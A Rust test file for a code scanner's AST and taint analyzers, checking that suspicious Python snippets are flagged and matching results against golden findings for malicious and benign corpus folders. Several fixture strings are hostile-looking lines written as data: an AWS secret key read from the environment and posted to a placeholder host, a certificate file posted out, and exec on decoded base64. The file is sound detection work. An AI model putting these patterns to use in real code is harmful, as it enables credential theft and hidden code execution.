//! Tests for `scanner::analyzers::ast` and `scanner::analyzers::taint`.
//!
//! Step 1: Unit tests (must fail before implementation).
//! Step 2: Per-file parity against the Python oracle for each corpus subdir.

use scanner::analyzers::{ast::scan_ast, taint::scan_taint};
use scanner::context::build_context;
use std::collections::BTreeMap;

// ---------------------------------------------------------------------------
// Step 1: Unit tests
// ---------------------------------------------------------------------------

#[test]
fn ast_exec_decode_chain() {
    let mut fc = BTreeMap::new();
    fc.insert(
        "r.py".to_string(),
        "import base64\nexec(base64.b64decode('AA=='))\n".to_string(),
    );
    assert!(
        scan_ast(&fc)
            .iter()
            .any(|x| x.rule_id == "ast.exec_decode_chain"),
        "exec(b64decode(...)) must produce ast.exec_decode_chain"
    );
}

#[test]
fn ast_subprocess_shell_true() {
    let mut fc = BTreeMap::new();
    fc.insert(
        "r.py".to_string(),
        "import subprocess\nsubprocess.run('x', shell=True)\n".to_string(),
    );
    assert!(
        scan_ast(&fc)
            .iter()
            .any(|x| x.rule_id == "ast.subprocess_shell_true"),
        "subprocess.run(..., shell=True) must produce ast.subprocess_shell_true"
    );
}

#[test]
fn taint_cred_to_net() {
    let mut fc = BTreeMap::new();
    fc.insert(
        "s.py".to_string(),
        "import os, requests\nk = os.environ['AWS_SECRET_ACCESS_KEY']\nrequests.post('http://e', data=k)\n".to_string(),
    );
    let f = scan_taint(&fc);
    let hit = f
        .iter()
        .find(|x| x.rule_id == "taint.cred_to_net")
        .expect("taint.cred_to_net must be found");
    assert_eq!(hit.severity, scanner::types::Severity::Critical);
}

// Additional unit tests for better coverage

#[test]
fn ast_exec_plain() {
    let mut fc = BTreeMap::new();
    fc.insert("a.py".to_string(), "exec('print(1)')\n".to_string());
    let findings = scan_ast(&fc);
    let hit = findings
        .iter()
        .find(|x| x.rule_id == "ast.exec")
        .expect("plain exec() must produce ast.exec");
    assert_eq!(hit.severity, scanner::types::Severity::Critical);
}

#[test]
fn ast_eval_plain() {
    let mut fc = BTreeMap::new();
    fc.insert("b.py".to_string(), "x = eval('1+1')\n".to_string());
    let findings = scan_ast(&fc);
    let hit = findings
        .iter()
        .find(|x| x.rule_id == "ast.eval")
        .expect("eval() must produce ast.eval");
    assert_eq!(hit.severity, scanner::types::Severity::High);
}

#[test]
fn ast_os_system() {
    let mut fc = BTreeMap::new();
    fc.insert(
        "c.py".to_string(),
        "import os\nos.system('ls')\n".to_string(),
    );
    let findings = scan_ast(&fc);
    assert!(
        findings.iter().any(|x| x.rule_id == "ast.os_system"),
        "os.system() must produce ast.os_system"
    );
}

#[test]
fn ast_subprocess_popen() {
    let mut fc = BTreeMap::new();
    fc.insert(
        "d.py".to_string(),
        "import subprocess\np = subprocess.Popen(['ls'])\n".to_string(),
    );
    let findings = scan_ast(&fc);
    assert!(
        findings.iter().any(|x| x.rule_id == "ast.subprocess_popen"),
        "subprocess.Popen() must produce ast.subprocess_popen"
    );
}

#[test]
fn ast_skips_non_py_files() {
    let mut fc = BTreeMap::new();
    fc.insert("script.sh".to_string(), "exec('x')\n".to_string());
    let findings = scan_ast(&fc);
    assert!(
        findings.is_empty(),
        "ast analyzer should skip non-.py files"
    );
}

#[test]
fn ast_dedup_same_rule_same_file() {
    let mut fc = BTreeMap::new();
    fc.insert("e.py".to_string(), "exec('a')\nexec('b')\n".to_string());
    let n = scan_ast(&fc)
        .iter()
        .filter(|x| x.rule_id == "ast.exec")
        .count();
    assert_eq!(n, 1, "same rule same file must be deduplicated");
}

#[test]
fn ast_exec_fromhex_chain() {
    let mut fc = BTreeMap::new();
    fc.insert(
        "f.py".to_string(),
        "exec(bytes.fromhex('deadbeef'))\n".to_string(),
    );
    let findings = scan_ast(&fc);
    assert!(
        findings
            .iter()
            .any(|x| x.rule_id == "ast.exec_decode_chain"),
        "exec(fromhex(...)) must produce ast.exec_decode_chain"
    );
}

#[test]
fn ast_reason_contains_filename() {
    let mut fc = BTreeMap::new();
    fc.insert("test_path/myfile.py".to_string(), "exec('x')\n".to_string());
    let findings = scan_ast(&fc);
    let hit = findings
        .iter()
        .find(|x| x.rule_id.starts_with("ast.exec"))
        .expect("must find ast.exec finding");
    assert!(
        hit.reason.contains("[file: test_path/myfile.py]"),
        "reason should contain [file: ...]: {:?}",
        hit.reason
    );
}

#[test]
fn taint_data_to_net() {
    let mut fc = BTreeMap::new();
    fc.insert(
        "g.py".to_string(),
        "import os, requests\nf = open('cert.pem', 'rb')\nrequests.post('http://x', data=f)\n"
            .to_string(),
    );
    let findings = scan_taint(&fc);
    assert!(
        findings.iter().any(|x| x.rule_id == "taint.data_to_net"),
        "open(cert.pem) + requests.post → taint.data_to_net"
    );
}

#[test]
fn taint_data_to_exec() {
    let mut fc = BTreeMap::new();
    fc.insert(
        "h.py".to_string(),
        "import os\nkey = os.environ['SECRET_KEY']\nexec(key)\n".to_string(),
    );
    let findings = scan_taint(&fc);
    assert!(
        findings.iter().any(|x| x.rule_id == "taint.data_to_exec"),
        "cred source + exec sink → taint.data_to_exec"
    );
}

#[test]
fn taint_no_finding_when_no_source() {
    let mut fc = BTreeMap::new();
    fc.insert(
        "i.py".to_string(),
        "import requests\nrequests.post('http://x', data='safe')\n".to_string(),
    );
    let findings = scan_taint(&fc);
    assert!(
        !findings.iter().any(|x| x.rule_id.starts_with("taint.")),
        "no source should produce no taint findings"
    );
}

#[test]
fn taint_cred_to_net_crit_over_data_to_net() {
    // When cred source is present, should emit cred_to_net (CRITICAL), NOT data_to_net
    let mut fc = BTreeMap::new();
    fc.insert(
        "j.py".to_string(),
        "import os, requests\nk = os.environ['AWS_SECRET_ACCESS_KEY']\nrequests.post('http://e', data=k)\n".to_string(),
    );
    let findings = scan_taint(&fc);
    assert!(
        findings.iter().any(|x| x.rule_id == "taint.cred_to_net"),
        "must have cred_to_net"
    );
    assert!(
        !findings.iter().any(|x| x.rule_id == "taint.data_to_net"),
        "must NOT have data_to_net when cred_to_net present"
    );
}

// ---------------------------------------------------------------------------
// Step 2: Per-file parity against committed golden finding sets.
//
// For each corpus subdir, build the file_cache, run scan_ast + scan_taint, and
// compare {rule_id, severity, reason} tuples (ast.* / taint.* only) against the
// golden tuples captured from the Python oracle pre-deletion. The Python package
// is now deleted, so these committed goldens are the parity oracle.
//
// Captured goldens (ast./taint.-only tuples):
//   malicious/decode_exec  => (ast.exec, CRITICAL, "exec() call detected [file: run.py]")
//   malicious/exfil_server => (taint.cred_to_net, CRITICAL,
//                              "Credential source flows to network sink [file: server.py]")
//   malicious/pipe_skill   => {}
//   malicious/poison_tool  => {}
//   benign/hello_skill     => {}
//   benign/util_lib        => {}
// ---------------------------------------------------------------------------

fn is_ast_taint_rule(rule_id: &str) -> bool {
    rule_id.starts_with("ast.") || rule_id.starts_with("taint.")
}

/// Run parity for one corpus subdir against the captured golden tuple set.
fn parity_for_dir(corpus_rel: &str, golden: &[(&str, &str, &str)]) {
    let manifest = env!("CARGO_MANIFEST_DIR");
    let repo_root = std::path::Path::new(manifest)
        .parent()
        .expect("scanner crate inside repo");
    let abs_path = repo_root.join(corpus_rel);

    let ctx = build_context(&abs_path);
    let mut rust_findings = scan_ast(&ctx.file_cache);
    rust_findings.extend(scan_taint(&ctx.file_cache));
    let rust_set: std::collections::BTreeSet<(String, String, String)> = rust_findings
        .iter()
        .filter(|f| is_ast_taint_rule(&f.rule_id))
        .map(|f| {
            (
                f.rule_id.clone(),
                f.severity.py_name().to_string(),
                f.reason.clone(),
            )
        })
        .collect();

    let golden_set: std::collections::BTreeSet<(String, String, String)> = golden
        .iter()
        .map(|(r, s, reason)| (r.to_string(), s.to_string(), reason.to_string()))
        .collect();

    assert_eq!(
        rust_set, golden_set,
        "AST/Taint parity mismatch for {corpus_rel}:\n  Rust:   {:?}\n  Golden: {:?}",
        rust_set, golden_set
    );
}

#[test]
fn parity_malicious_decode_exec() {
    parity_for_dir(
        "scanner/tests/corpus_scan/malicious/decode_exec",
        &[(
            "ast.exec",
            "CRITICAL",
            "exec() call detected [file: run.py]",
        )],
    );
}

#[test]
fn parity_malicious_exfil_server() {
    parity_for_dir(
        "scanner/tests/corpus_scan/malicious/exfil_server",
        &[(
            "taint.cred_to_net",
            "CRITICAL",
            "Credential source flows to network sink [file: server.py]",
        )],
    );
}

#[test]
fn parity_malicious_pipe_skill() {
    parity_for_dir("scanner/tests/corpus_scan/malicious/pipe_skill", &[]);
}

#[test]
fn parity_malicious_poison_tool() {
    parity_for_dir("scanner/tests/corpus_scan/malicious/poison_tool", &[]);
}

#[test]
fn parity_benign_hello_skill() {
    parity_for_dir("scanner/tests/corpus_scan/benign/hello_skill", &[]);
}

#[test]
fn parity_benign_util_lib() {
    parity_for_dir("scanner/tests/corpus_scan/benign/util_lib", &[]);
}
